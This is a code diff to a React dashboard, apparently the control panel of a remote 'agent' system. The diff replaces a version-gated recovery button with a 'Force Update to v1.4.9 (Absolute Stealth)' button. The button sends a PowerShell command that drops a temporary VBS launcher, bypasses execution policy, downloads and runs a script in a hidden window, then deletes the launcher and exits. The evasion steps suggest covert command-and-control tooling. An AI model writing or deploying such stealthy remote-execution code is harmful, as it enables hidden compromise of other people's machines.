@@ -470,7 +470,7 @@ export default function LiveDataDashboard() {
                         </span>
                     )}
                 </h2>
-                <div className="bg-black/50 border border-slate-800 rounded-xl p-6 overflow-x-auto custom-scrollbar min-h-[100px] flex items-center justify-center">
+                <div className="bg-black/50 border border-slate-800 rounded-xl p-6 overflow-x-auto custom-scrollbar min-h-[100px]">
                     {currentAgent?.lastLog ? (
                         <pre className="w-full text-xs font-mono text-emerald-400/90 leading-relaxed whitespace-pre">
                             {currentAgent.lastLog}
@@ -482,31 +482,33 @@ export default function LiveDataDashboard() {
                                     ? `Waiting for Agent (v${currentAgent.version}) to update to v1.2.7+...` 
                                     : "No logs received yet. Agent must be online."}
                             </div>
-                            {currentAgent?.version && currentAgent.version < "1.2.7" && (
-                                <button 
-                                    onClick={async () => {
-                                        try {
-                                            const res = await fetch('/api/agent/command', {
-                                                method: 'POST',
-                                                headers: { 'Content-Type': 'application/json' },
-                                                body: JSON.stringify({
-                                                    agentId: currentAgent.agentId,
-                                                    type: 'shell',
-                                                    payload: { command: `$v = "$env:Temp\\upd_$(Get-Random).vbs"; "CreateObject(\`"WScript.Shell\`").Run \`"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://${window.location.host}/api/agent/update' -OutFile '$env:ProgramData\\UnifiedAgent\\unified-agent.ps1'; Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\`"$env:ProgramData\\UnifiedAgent\\unified-agent.ps1\\\`"' -WindowStyle Hidden\`, 0, False" | Out-File $v -Encoding ascii; Start-Process "wscript.exe" $v; Start-Sleep 2; Remove-Item $v -ErrorAction SilentlyContinue; Stop-Process -Id $PID` }
-                                                })
-                                            });
-                                            if (!res.ok) throw new Error(await res.text());
-                                            alert('Recovery Update Triggered! Agent should download the core system directly and restart within 10 seconds.');
-                                        } catch (e: any) {
-                                            alert(`Recovery Command Failed: ${e.message}`);
-                                        }
-                                    }}
-                                    className="px-6 py-2 bg-rose-600 hover:bg-rose-500 text-white font-bold rounded-xl shadow-lg shadow-rose-600/20 text-xs transition-all flex items-center gap-2 mt-2 pointer-events-auto"
-                                >
-                                    <AlertTriangle size={14} className="text-white" />
-                                    Force Recovery Update (Fixes v1.2.0 deadlock)
-                                </button>
-                            )}
+                        </div>
+                    )}
+                    {selectedAgentId && (
+                        <div className="mt-6 flex justify-center border-t border-slate-800 pt-6">
+                            <button 
+                                onClick={async () => {
+                                    try {
+                                        const res = await fetch('/api/agent/command', {
+                                            method: 'POST',
+                                            headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify({
+                                                agentId: selectedAgentId,
+                                                type: 'shell',
+                                                payload: { command: `$v = "$env:Temp\\upd_$(Get-Random).vbs"; "CreateObject(\`"WScript.Shell\`").Run \`"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://${window.location.host}/api/agent/update' -OutFile '$env:ProgramData\\UnifiedAgent\\unified-agent.ps1'; Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \\\`"$env:ProgramData\\UnifiedAgent\\unified-agent.ps1\\\`"' -WindowStyle Hidden\`, 0, False" | Out-File $v -Encoding ascii; Start-Process "wscript.exe" $v; Start-Sleep 2; Remove-Item $v -ErrorAction SilentlyContinue; Stop-Process -Id $PID` }
+                                            })
+                                        });
+                                        if (!res.ok) throw new Error(await res.text());
+                                        alert('Force Update Triggered! Agent will download v1.4.9 Stealth directly and restart. Please wait 10 seconds.');
+                                    } catch (e: any) {
+                                        alert(`Force Update Failed: ${e.message}`);
+                                    }
+                                }}
+                                className="px-6 py-2 bg-rose-600 hover:bg-rose-500 text-white font-bold rounded-xl shadow-lg shadow-rose-600/20 text-xs transition-all flex items-center gap-2 pointer-events-auto"
+                            >
+                                <AlertTriangle size={14} className="text-white" />
+                                Force Update to v1.4.9 (Absolute Stealth)
+                            </button>
                         </div>
                     )}
                 </div>
